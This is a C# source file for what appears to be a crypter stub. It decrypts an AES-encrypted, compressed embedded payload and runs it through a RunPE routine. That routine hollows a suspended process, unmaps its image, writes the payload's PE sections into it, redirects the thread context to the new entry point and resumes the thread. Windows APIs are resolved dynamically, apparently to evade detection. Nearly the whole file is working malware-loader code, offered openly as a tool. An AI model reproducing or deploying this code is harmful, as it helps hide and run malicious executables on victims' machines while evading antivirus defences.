using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SecureByAMn
{
    public class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        public static void Main()
        {
            var b = AesAdvancedCompression.Decompress(AesAdvancedCompression.Decrypt(Settings.code, Settings.passwd));
            RunPE.Execute(Settings.processRunpe, b);
        }
    }

    public class AesAdvancedCompression
    {
        private const int SaltSize = 32;
        private const int Iterations = 50000;
        private const int KeySize = 32;

        //Stub = Decompress > Decrypt
        //Server = Encrypt > Compress

        public static string EncryptBase64(byte[] payload, string password)
        {
            // Génération d'un sel plus grand pour plus de sécurité
            var salt = new byte[SaltSize];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(salt);
            }

            // Dérivation de clé renforcée
            using (var keyDerivationFunction = new Rfc2898DeriveBytes(password, salt, Iterations))
            {
                var key = keyDerivationFunction.GetBytes(KeySize);
                var additionalEntropy = keyDerivationFunction.GetBytes(16); // Entropie supplémentaire pour l'IV

                using (var aes = new AesManaged()) // AesManaged au lieu de RijndaelManaged
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;
                    aes.Key = key;

                    // Génération d'IV avec entropie supplémentaire
                    using (var hmac = new HMACSHA256(additionalEntropy))
                    {
                        aes.IV = hmac.ComputeHash(salt).Take(16).ToArray();
                    }

                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    byte[] encryptedData;
                    using (var msEncrypt = new MemoryStream())
                    {
                        using (var cryptoStream =
                               new CryptoStream(msEncrypt, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        using (var hmacStream = new HMACSHA256(key)) // HMAC pour l'intégrité
                        {
                            cryptoStream.Write(payload, 0, payload.Length);
                            cryptoStream.FlushFinalBlock();
                            encryptedData = msEncrypt.ToArray();

                            // Calcul du HMAC sur les données chiffrées
                            var hmacValue = hmacStream.ComputeHash(encryptedData);

                            // Assemblage final : sel + IV + HMAC + données chiffrées
                            var result =
                                new byte[salt.Length + aes.IV.Length + hmacValue.Length + encryptedData.Length];
                            Buffer.BlockCopy(salt, 0, result, 0, salt.Length);
                            Buffer.BlockCopy(aes.IV, 0, result, salt.Length, aes.IV.Length);
                            Buffer.BlockCopy(hmacValue, 0, result, salt.Length + aes.IV.Length, hmacValue.Length);
                            Buffer.BlockCopy(encryptedData, 0, result, salt.Length + aes.IV.Length + hmacValue.Length,
                                encryptedData.Length);

                            return Convert.ToBase64String(result);
                        }
                    }
                }
            }
        }

        public static byte[] Decrypt(string encryptedText, string password)
        {
            var encryptedBytes = Convert.FromBase64String(encryptedText);

            if (encryptedBytes.Length < SaltSize + 16 + 32) // Vérification de la taille minimale
                throw new CryptographicException("Données chiffrées invalides");

            var salt = encryptedBytes.Take(SaltSize).ToArray();
            var iv = encryptedBytes.Skip(SaltSize).Take(16).ToArray();
            var hmacValue = encryptedBytes.Skip(SaltSize + 16).Take(32).ToArray();
            var cipherText = encryptedBytes.Skip(SaltSize + 16 + 32).ToArray();

            using (var keyDerivationFunction = new Rfc2898DeriveBytes(password, salt, Iterations))
            {
                var key = keyDerivationFunction.GetBytes(KeySize);

                // Vérification de l'intégrité
                using (var hmac = new HMACSHA256(key))
                {
                    var computedHmac = hmac.ComputeHash(cipherText);
                    if (!computedHmac.SequenceEqual(hmacValue))
                        throw new CryptographicException("L'intégrité des données a été compromise");
                }

                using (var aes = new AesManaged())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;
                    aes.Key = key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    try
                    {
                        using (var msDecrypt = new MemoryStream(cipherText))
                        using (var cryptoStream =
                               new CryptoStream(msDecrypt, aes.CreateDecryptor(), CryptoStreamMode.Read))
                        using (var resultStream = new MemoryStream())
                        {
                            cryptoStream.CopyTo(resultStream);
                            return resultStream.ToArray();
                        }
                    }
                    catch (CryptographicException ex)
                    {
                        throw new CryptographicException(
                            "Échec du déchiffrement - Mot de passe incorrect ou données corrompues", ex);
                    }
                }
            }
        }

        // Méthodes de compression inchangées...
        public static byte[] Compress(byte[] data)
        {
            using (var memoryStream = new MemoryStream())
            {
                using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
                {
                    gzipStream.Write(data, 0, data.Length);
                }

                return memoryStream.ToArray();
            }
        }

        public static byte[] Decompress(byte[] compressedData)
        {
            using (var compressedStream = new MemoryStream(compressedData))
            using (var decompressedStream = new MemoryStream())
            using (var gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            {
                gzipStream.CopyTo(decompressedStream);
                return decompressedStream.ToArray();
            }
        }
    }

    public class RunPE
    {

        #region API delegate

        private delegate int DelegateResumeThread(IntPtr handle);

        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);

        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);

        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);

        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);

        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize,
            ref int bytesWritten);

        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize,
            ref int bytesRead);

        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);

        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine,
            IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory,
            ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        #endregion


        #region API

        private static readonly DelegateResumeThread ResumeThread =
            LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");

        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext =
            LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");

        private static readonly DelegateSetThreadContext SetThreadContext =
            LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");

        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext =
            LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");

        private static readonly DelegateGetThreadContext GetThreadContext =
            LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");

        private static readonly DelegateVirtualAllocEx VirtualAllocEx =
            LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");

        private static readonly DelegateWriteProcessMemory WriteProcessMemory =
            LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");

        private static readonly DelegateReadProcessMemory ReadProcessMemory =
            LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");

        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection =
            LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");

        private static readonly DelegateCreateProcessA CreateProcessA =
            LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");

        #endregion


        #region CreateAPI

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess,
            [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

        private static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }

        #endregion


        #region Structure

        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)]
            private readonly byte[] Misc;

            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }

        #endregion


        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0x0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                try
                {
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000,
                            IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
                    int[] context = new int[0xB3];
                    context[0x0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    {
                        if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }
                    else
                    {
                        if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }

                    int ebx = context[0x29];
                    int baseAddress = 0x0;
                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite))
                        throw new Exception();
                    if (imageBase == baseAddress)
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0)
                            throw new Exception();
                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);

                    if (newImageBase == 0x0) throw new Exception();
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite))
                        throw new Exception();
                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);
                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData,
                                    sectionData.Length, ref readWrite)) throw new Exception();
                        }

                        sectionOffset += 0x28;
                    }

                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite))
                        throw new Exception();
                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
                    if (allowOverride) newImageBase = imageBase;
                    context[0x2C] = newImageBase + addressOfEntryPoint;

                    if (IntPtr.Size == 0x4)
                    {
                        if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }
                    else
                    {
                        if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
                    }

                    if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
                }
                catch
                {
                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                    continue;
                }

                break;
            }
        }
    }
}